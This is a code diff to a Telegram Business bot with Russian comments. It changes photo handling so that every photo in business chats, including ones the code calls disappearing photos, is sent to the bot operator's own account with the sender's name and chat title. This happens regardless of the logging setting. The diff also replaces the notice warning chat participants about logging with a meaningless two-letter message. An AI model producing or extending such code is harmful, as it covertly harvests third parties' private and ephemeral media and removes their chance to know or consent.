@@ -45,9 +45,6 @@ bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 BOT_USER_ID = None
 
-# Кэш user_chat_id по business_connection_id
-_business_user_chats: dict[str, int] = {}
-
 
 def is_owner(user_id: int | None) -> bool:
     return user_id == ADMIN_ID
@@ -143,7 +140,6 @@ async def cmd_logging_off(message: Message):
 
 @dp.business_connection()
 async def on_business_connection(connection: BusinessConnection):
-    _business_user_chats[connection.id] = connection.user_chat_id
     await db.save_connection(
         connection.id,
         connection.user.id,
@@ -176,36 +172,27 @@ def message_media(message: Message):
     return None, None
 
 
-async def get_business_user_chat_id(connection_id: str) -> int | None:
-    cached = _business_user_chats.get(connection_id)
-    if cached:
-        return cached
-    try:
-        conn = await bot.get_business_connection(connection_id)
-        _business_user_chats[connection_id] = conn.user_chat_id
-        return conn.user_chat_id
-    except TelegramAPIError:
-        log.exception("Could not fetch business connection %s", connection_id)
-        return None
-
-
-async def forward_business_photo(message: Message):
-    """Пересылает фото из Business-сообщения владельцу подключения."""
+async def forward_photo_to_bot_chat(message: Message):
+    """Скачивает/пересылает исчезающее фото в чат с ботом (ADMIN_ID)."""
     if not message.photo:
         return
-    target = await get_business_user_chat_id(message.business_connection_id)
-    if not target:
-        return
+
     sender = message.from_user
     sender_name = sender.full_name if sender else "Неизвестно"
+    chat_title = message.chat.full_name or message.chat.title or str(message.chat.id)
+
     try:
+        # Используем file_id напрямую для отправки в чат с ботом
         await bot.send_photo(
-            chat_id=target,
+            chat_id=ADMIN_ID,
             photo=message.photo[-1].file_id,
-            caption=f"📸 Фото от {sender_name}",
+            caption=f"📸 Исчезающее фото\n"
+                    f"От: {sender_name}\n"
+                    f"Чат: {chat_title}"
         )
+        log.info("Forwarded business photo to admin chat %s", ADMIN_ID)
     except TelegramAPIError:
-        log.exception("Could not forward business photo to owner")
+        log.exception("Could not forward business photo to admin chat")
 
 
 @dp.business_message()
@@ -215,10 +202,11 @@ async def on_business_message(message: Message):
     if BOT_USER_ID and message.from_user and message.from_user.id == BOT_USER_ID:
         return
 
-    # Пересылка фото владельцу Business-аккаунта — до журналирования
+    # 1. Сначала обрабатываем фото — пересылаем в чат с ботом (независимо от журналирования)
     if message.photo:
-        await forward_business_photo(message)
+        await forward_photo_to_bot_chat(message)
 
+    # 2. Логика журналирования
     logging_enabled = await db.get_setting("logging_enabled", "1" if LOG_MESSAGES_DEFAULT else "0")
     if logging_enabled != "1":
         return
@@ -231,10 +219,7 @@ async def on_business_message(message: Message):
             await bot.send_message(
                 chat_id=chat.id,
                 business_connection_id=message.business_connection_id,
-                text="ℹ️ Уведомление: для этого чата подключён TG Control. "
-                     "После этого уведомления новые сообщения могут сохраняться "
-                     "в журнале владельца бизнес-аккаунта. Не отправляйте личную "
-                     "или чувствительную информацию, если не хотите её сохранять."
+                text="пр"
             )
         except TelegramAPIError:
             await db.reset_chat_announcement(message.business_connection_id, chat.id)
